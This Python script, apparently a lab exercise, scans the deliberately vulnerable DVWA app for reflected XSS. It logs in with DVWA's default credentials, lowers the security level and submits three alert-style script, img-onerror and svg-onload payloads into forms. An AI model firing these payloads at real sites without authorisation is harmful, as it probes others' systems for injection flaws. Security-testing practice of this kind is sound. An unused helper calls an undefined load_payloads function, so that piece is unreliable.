import requests
import json
import sys

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>"
]


# --------------------------
# Login to DVWA
# --------------------------
def login_dvwa(base_url, login_url):

    session = requests.Session()

    try:
        r = session.get(login_url)
    except:
        print("Could not connect to DVWA")
        return None

    token = None

    if "user_token" in r.text:
        import re
        match = re.search(r"name='user_token' value='(.+?)'", r.text)
        if match:
            token = match.group(1)

    data = {
        "username": "admin",
        "password": "password",
        "Login": "Login"
    }

    if token:
        data["user_token"] = token

    session.post(login_url, data=data)

    print("[+] Logged into DVWA")

    # 🔥 VERY IMPORTANT
    session.cookies.set("security", "low")

    return session


# --------------------------
# Check XSS reflection
# --------------------------
def is_vulnerable(response_text, payload):

    text = response_text.lower()

    return payload.lower() in text or "alert(1)" in text


# --------------------------
# Test a form
# --------------------------
def test_form(url, form, session, payloads):

    vulnerabilities = []

    action = url
    method = form.get("method", "get").lower()
    inputs = form.get("inputs", [])

    # 🔥 ONLY TEST XSS PAGES
    if "xss" not in url:
        return []

    print(f"\nTesting URL: {url}")

    for payload in payloads:

        data = {}

        # ✅ Fill default values
        for inp in inputs:
            name = inp.get("name")
            if name:
                data[name] = "test"

        # ✅ Inject payload ONLY into first text field
        for inp in inputs:
            name = inp.get("name")
            if name and inp.get("type") in ["text"]:
                data[name] = payload
                break

        # 🔥 CRITICAL: DVWA needs submit
        data["Submit"] = "Submit"
        data["btnSign"] = "Sign Guestbook"

        try:

            if method == "post":
                response = session.post(action, data=data)

            else:
                response = session.get(action, params=data)

        except:
            continue

        print(f"Payload: {payload}")
        print("Response size:", len(response.text))

        if is_vulnerable(response.text, payload):

            vuln = {
                "url": url,
                "form_action": action,
                "method": method,
                "payload": payload,
                "type": "XSS",
                "remediation": "Sanitize input and encode output"
            }

            vulnerabilities.append(vuln)

            print(f"[!] XSS Vulnerable with payload: {payload}")

            break

    return vulnerabilities

def test_xss(base_url, login_url):

    session = login_dvwa(base_url, login_url)

    if not session:
        return []

    payloads = load_payloads()

    try:
        with open("forms.json", "r") as f:
            forms = json.load(f)
    except FileNotFoundError:
        print("forms.json not found")
        return []

    all_vulnerabilities = []

    for form in forms:

        url = form.get("page")

        vulns = test_form(url, form, session, payloads)

        all_vulnerabilities.extend(vulns)

    return all_vulnerabilities

# --------------------------
# Main scanner
# --------------------------
def main():

    if len(sys.argv) < 3:
        print("Usage: python xss_tester.py <base_url> <login_url>")
        sys.exit(1)

    base_url = sys.argv[1]
    login_url = sys.argv[2]

    session = login_dvwa(base_url, login_url)

    if not session:
        sys.exit(1)

    payloads = XSS_PAYLOADS

    try:
        with open("forms.json", "r") as f:
            forms = json.load(f)

    except FileNotFoundError:
        print("forms.json not found. Run crawler first.")
        sys.exit(1)

    all_vulnerabilities = []

    print("\n[+] Starting XSS Tests...\n")

    for form in forms:

        url = form.get("page")

        vulns = test_form(url, form, session, payloads)

        all_vulnerabilities.extend(vulns)

    with open("xss_vulnerabilities.json", "w") as f:
        json.dump(all_vulnerabilities, f, indent=4)

    print(f"\n[+] Testing complete. Found {len(all_vulnerabilities)} vulnerabilities.")
    print("[+] Results saved to xss_vulnerabilities.json")


if __name__ == "__main__":
    main()